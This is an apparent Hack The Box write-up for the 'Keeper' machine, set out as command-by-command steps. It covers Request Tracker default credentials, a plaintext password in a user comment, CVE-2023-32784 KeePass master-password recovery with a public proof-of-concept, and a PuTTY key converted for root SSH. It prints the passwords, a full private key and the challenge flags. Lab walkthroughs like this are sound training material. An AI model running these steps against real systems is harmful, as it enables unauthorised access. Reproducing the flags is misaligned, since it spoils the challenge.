# HTB - Keeper

## Machine Info

|Field|Details|
|---|---|
|OS|Linux (Ubuntu 22.04.3)|
|Difficulty|Easy|
|IP|10.129.229.41|
|User|lnorgaard|
|User flag|`83a6f016b521a337bcc7ff62ca243957`|
|Root flag|`65e77591f4e9cf0947acf641604a63d4`|

## Tags

#htb #linux #request-tracker #default-credentials #keepass #CVE-2023-32784 #putty #oscp-like

---

## Attack Path Overview

```
Nmap → port 80 (Request Tracker)
→ Default credentials (root:password) → RT admin panel
→ lnorgaard user profile → plaintext password in Comments
→ SSH as lnorgaard → user flag
→ RT30000.zip → KeePassDumpFull.dmp + passcodes.kdbx
→ CVE-2023-32784 → master password: rødgrød med fløde
→ kpcli → PuTTY private key in Notes
→ puttygen → OpenSSH key → SSH as root → root flag
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.229.41
nmap -sV -sC -p 22,80 10.129.229.41
```

|Port|Service|
|---|---|
|22|SSH (OpenSSH)|
|80|HTTP (nginx)|

### Web Enumeration

Browsing to `http://10.129.229.41` shows a redirect message:

```
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
```

Add both hostnames to `/etc/hosts`:

```bash
echo "10.129.229.41 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

Navigate to `http://tickets.keeper.htb/rt/` — **Request Tracker (RT)** login page.

---

## Foothold — Default Credentials on Request Tracker

Request Tracker's default credentials are `root:password`. Logging in with these grants full admin access.

Navigate to:

```
Admin → Users → Select "Show All Users"
http://tickets.keeper.htb/rt/Admin/Users/
```

Two users found:

|#|Username|Real Name|Email|
|---|---|---|---|
|27|lnorgaard|Lise Nørgaard|lnorgaard@keeper.htb|
|14|root|Enoch Root|root@localhost|

Click on `lnorgaard` → scroll to **"Comments about this user"**:

```
New user. Initial password set to Welcome2023!
```

**Credential:** `lnorgaard : Welcome2023!`

---

## User Flag — lnorgaard via SSH

```bash
ssh lnorgaard@10.129.229.41
# password: Welcome2023!
```

```bash
cat ~/user.txt
# 83a6f016b521a337bcc7ff62ca243957
```

---

## Privilege Escalation — lnorgaard → root

### Discovering KeePass Files

```bash
ls -la ~
```

Found: `RT30000.zip` (87MB)

```bash
unzip RT30000.zip
ls
# KeePassDumpFull.dmp
# passcodes.kdbx
```

Copy files to attacker machine:

```bash
scp lnorgaard@10.129.229.41:~/KeePassDumpFull.dmp .
scp lnorgaard@10.129.229.41:~/passcodes.kdbx .
```

### CVE-2023-32784 — KeePass Master Password Dump

CVE-2023-32784 allows recovery of a KeePass master password from a process memory dump. KeePass leaves partial password strings in memory as the user types each character.

```bash
git clone https://github.com/CMEPW/keepass-dump-masterkey
cd keepass-dump-masterkey
python3 poc.py -d ../KeePassDumpFull.dmp
```

Output:

```
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
...
```

The first character is unrecoverable. The pattern `●dgr●d med fl●de` matches the Danish dessert **rødgrød med fløde**.

**Master password:** `rødgrød med fløde`

### Extracting the PuTTY Private Key from KeePass

```bash
kpcli --kdb /home/kali/passcodes.kdbx
# password: rødgrød med fløde
```

```
kpcli:/> cd passcodes/Network
kpcli:/passcodes/Network> ls
  0. keeper.htb (Ticketing Server)
  1. Ticketing System

kpcli:/passcodes/Network> show -f 0
```

Output reveals:

- **Username:** `root`
- **Password:** `F4><3K0nd!`
- **Notes:** PuTTY private key (PPK format)

```
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       ...
```

### Converting PuTTY Key to OpenSSH

Save the full Notes content to a `.ppk` file:

```bash
cat > keeper.ppk << 'EOF'
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
EOF

# Convert PuTTY → OpenSSH
puttygen keeper.ppk -O private-openssh -o keeper_rsa
chmod 600 keeper_rsa

# SSH as root
ssh -i keeper_rsa root@10.129.229.41
```

---

## Root Flag

```bash
cat /root/root.txt
# 65e77591f4e9cf0947acf641604a63d4
```

---

## Key Takeaways

- **Default credentials on web apps** — RT's `root:password` default is well-known; always check default creds before attempting more complex attacks
- **Plaintext credentials in user comments** — admins storing passwords in ticket system notes is a common misconfiguration
- **CVE-2023-32784** — KeePass 2.x leaks partial master password strings in memory; even a process dump (not full RAM dump) is sufficient
- **PuTTY key format** — PPK keys must be converted to OpenSSH format with `puttygen` before use with standard `ssh` client
- **Password reuse** — the KeePass DB contained root's SSH key AND password, either of which alone would have been sufficient

## Credentials Summary

|User|Password|Source|
|---|---|---|
|root (RT)|password|Default credentials|
|lnorgaard|Welcome2023!|RT user Comments field|
|root (SSH)|F4><3K0nd!|KeePass DB (Network entry)|
|root (SSH key)|—|KeePass DB Notes (PuTTY PPK)|

## CVE Reference

|CVE|Description|Tool|
|---|---|---|
|CVE-2023-32784|KeePass master password recovery from memory dump|keepass-dump-masterkey|